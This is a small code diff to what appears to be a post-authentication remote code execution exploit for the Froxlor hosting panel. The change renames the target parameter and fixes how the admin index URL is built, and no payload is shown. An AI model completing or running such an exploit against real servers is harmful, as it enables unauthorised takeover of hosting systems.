@@ -19,13 +19,13 @@ warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
 
 
 class FroxlorPostAuthRCE: 
-    def __init__(self, target_ip: str, cookie:str):
-        self.target_ip = target_ip
+    def __init__(self, target_origin: str, cookie:str):
+        self.target_origin = target_origin
         self.request = requests.session()
         self.request.cookies.set_cookie(cookie)
 
     def exploit(self):
-        index_url = url + "/admin_index.php"
+        index_url = "http://" + self.target_origin + "/admin_index.php"
         self.request.get(index_url)
         
         
